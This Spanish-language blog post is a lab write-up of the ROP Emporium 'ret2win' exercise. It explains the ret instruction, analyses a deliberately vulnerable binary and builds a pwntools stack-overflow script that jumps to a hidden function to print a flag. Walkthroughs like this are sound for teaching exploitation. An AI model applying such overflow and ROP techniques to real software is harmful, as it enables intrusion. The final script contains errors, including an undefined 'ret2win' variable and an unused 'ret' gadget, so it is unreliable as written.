---
layout: post
title: ROPemporium ret2win - saltando a una funcion con ROP
author: c4rta
date: 2023-01-03
categories: [Explotacion binaria]
tags: [ROP]
---

Resolucion del ejercicio ret2win usando ROP para saltar a una funcion

## Explicacion de ret

Cabe aclara que ```ret``` es la clave de ROP, asi que te explicare como funciona

Imagina que tenemos este codigo:

```
func:
  0x01 intruccion
  .
  .
  .
  ret
main:
  0x02 intruccion
  .
  .
  0x03 call func
  0x04 intruccion
```

Tenemos que en el main se hace un llamado a la funcion ```func``` la cual tiene un ret y una vez que se termine de ejecutar la funcion ```func``` hay mas intrucciones, veamos como funciona.

Imaginemos que el ```RIP``` apunta a la direccion ```0x02```

```
func:
  0x01 intruccion
  .
  .
  .
  ret
main:
  0x02 intruccion --> RIP
  .
  .
  0x03 call func
  0x04 intruccion


stack:

ESP -->|         | H
       |         |
       |         |
       |         |
       |         |
       |         |
       |         |
       |         | L
```
Cuando el RIP apunte a la direccion ```0x03```, es decir cuando se llama a ```func```, va a hacer push de la siguiente intruccion es decir la que esta en la direccion ```0x04```y el layout queda asi:

```
func:
  0x01 intruccion
  .
  .
  .
  ret
main:
  0x02 intruccion
  .
  .
  0x03 call func --> RIP
  0x04 intruccion 


stack:

ESP -->|  0x04   | H
       |         |
       |         |
       |         |
       |         |
       |         |
       |         |
       |         | L
```

Ahora el RIP apunta de la direccion de la funcion y el layout queda asi

```
func:
  0x01 intruccion --> RIP
  .
  .
  .
  ret
main:
  0x02 intruccion
  .
  .
  0x03 call func 
  0x04 intruccion 


stack:

ESP -->|  0x04   | H
       |         |
       |         |
       |         |
       |         |
       |         |
       |         |
       |         | L
```

Una que vez que ejecuten todas las intrucciones de la funcion, va a ejecutar ```ret```, y lo que va a pasar es que va a hacer ```pop``` de lo que este en el top del stack, osea a lo que este apuntando ```RSP``` y lo va a meter en el ```RIP```, el layout queda asi:

```
func:
  0x01 intruccion 
  .
  .
  .
  ret 
main:
  0x02 intruccion
  .
  .
  0x03 call func 
  0x04 intruccion --> RIP


stack:

ESP -->|         | H
       |         |
       |         |
       |         |
       |         |
       |         |
       |         |
       |         | L
```
Como vemos, el RIP tomo el valor que estaba en el RSP y es por eso que ahora el RIP apunta a 0x04.
Asi es como funciona ret

### Esto pa que nos sirve

Pues es muy facil, resumidamente seria algo como:

```ret``` hace ```pop``` de lo que este en el ```RSP``` y lo mete en el ```RIP```, nosotros sobreescribiremos el ```RIP``` con la direccion de la funcion ```ret2win```, entonces cuando ```ret``` y ```RIP``` se ejecuten, va a ejecutar la funcion ```ret2win``` y mostrara la flag, ya que el ```RIP``` contiene la siguiente intruccion a ejecutar

Es por eso por lo que necesitamos la intruccion ret en el exploit, antes de sobreescribir el RIP.

## Analisis del binario

Primeramente podemos empezar a sacar informacion del binario, ya sea con ```checksec``` (pwntools) o ```rabin2``` (radare2), el resultado que no da rabin2 es:

```
arch     x86
baddr    0x400000
binsz    6739
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
Es un binario de 64 bits, no tiene PIE, canary, pero tiene NX, asi que no podemos ejecutar codigo en el stack

---

Ahora pasaramos a hacer reversing de nuestro binario, puede usar la herramienta que sea, yo usare IDA y gdb con pwndbg, y me ire directamente a la funcion ```main```

![](/assets/img/ret2win/ida1.png)

Lo unico interesante aqui es que se esta llamando a la funcion ```pwnme``` asi que vamos para alla

![](/assets/img/ret2win/ida2.png)

Por lo que parece, la funcion ```main``` llama a ```pwnme``` y ahi es donde se recibe una entrada del usuario.

Lo primero interesante que vemos es que se esta creando un buffer de ```20h``` o 32 bytes y que se almacena en ```s```

![](/assets/img/ret2win/ida3.png)

Como indica la instruccion ```s               = byte ptr -20h``` y ```lea     rax, [rbp+s]```.

Mas abajo podemos ver la parte en la que se recibe el input al usuario:

![](/assets/img/ret2win/ida4.png)

Podemos ver que ```rax``` se a asignado en ```rbp-s``` y ```s``` como mencione, contiene el buffer de 32 bytes, ademas se hace un ```call``` a la funcion ```_read``` que recibe el input del usuario el cual son 38 bytes como lo indica la intruccion ```mov     edx, 38h```.

Asi que nuestro programa esta permitiendo ```0x30h - 0x20h``` para ocasionar un buffer overflow

Estas cifras pasandolas a decimal quedarian:

```
0x20h = 32
0x38h = 56
```

## ret2win

Aqui es donde empezamos a ver ROP, y como mencione en el titulo vamos a "saltar a una funcion" y esa funcion se llama ```ret2win```, pero... Como vimos, esa funcion nunca se llama en el programa, para encontrarla, en caso de que estes usando radare2 simplemente ingresa el comando ```alf``` y podras ver todas las funciones que hay en el programa, en mi caso como use IDA, me sale en un apartado a la izquierda. Veamos el codigo de la funcion:

![](/assets/img/ret2win/ida5.png)

Aqui lo unico interesante que hace es hacer un cat a la flag, y bueno, es posible saltar a una funcion ya que casi todas terminan con la intruccion ```ret``` y esto nos permite crear cadenas ROP (no las usaremos en este ejercicio)

## Construyendo el payload

En mi caso usare pwndbg, asi que metere el programa y con ```cyclic 100``` generare una secuencia de 100 caracteres que le pasare como input, una vez que el programa pete.

### Llenado el buffer

Sabemos que nuestro buffer es que 32 bytes ya cuando hicimos el analisis estaba como ```rbp-20h``` y eso es 32, asi que empezamos a craftear nuestro explot que de momento va asi:

```py
from pwn import *

proc = process("./ret2win")

buffer = b"A" * 32

proc.sendline(payload)
print(proc.recvall().decode())
```

### Sacando el offset de RBP

Esto simplemente es padding para llegar al RIP, y como estamos en un binario de 64 bits, entonces esto seran 8 bytes y nuestro payload queda asi:

```py
from pwn import *

proc = process("./ret2win")

buffer = b"A" * 32
rbp = b"B" * 8

proc.sendline(payload)
print(proc.recvall().decode())
```

### Sacando el offset del RIP

Como siempre, en x64 podemos usar sacar el offset del RSP para saber el desplazamiento para llegar al RIP, o sacar el offset del RBP y sumarle 8 bytes, al fin de cuentas ambos llegan al RIP jaja

Ahora ya podemos sacar el offset del RSP, como al programa le pasos lo que nos dio ```cyclic 100```, entonces en el RSP debio de salir algo como esto:

![](/assets/img/ret2win/gdb.png)

Vemos como en el RSP tiene el valor de ```faaaaaaa``` asi que ahora con el comando ```cyclic -l faaaaaaa``` podemos saber el offset del RSP, y nos dio 40 (ese es el desplazamiento para llegar al RIP)

### Direccion de ret y ret2win

Para sacar la direccion de ```ret2win``` simplemente ponemos ```p ret2win``` y nos arroja:

```$1 = {<text variable, no debug info>} 0x400756 <ret2win>```

Y para la direccion de ```ret``` podemos usar la que nos indica el programa, o sacar un gadget con herramientas como ```Ropper```, pero me da flojera y usare la del programa que es ```0x400755```, y lo podemos ver en el pwndbg:

```► 0x400755 <pwnme+109>    ret    <0x6161616161616166>```

Con todo esto nuestro exploit queda asi:

```py
from pwn import *

proc = process("./ret2win")

buffer = b"A" * 32
rbp = b"B" * 8
ret = p64(0x400755)
rip = p64(0x400756) #direccion de ret2win

payload = buffer + rbp + rip + ret2win

proc.sendline(payload)
print(proc.recvall().decode())
```

Entonces lo ejecutamos y nos da la flag

![](/assets/img/ret2win/pwn.png)

Eso ha sido todo, gracias por leer ❤

![](/assets/img/ret2win/waifu.jpg)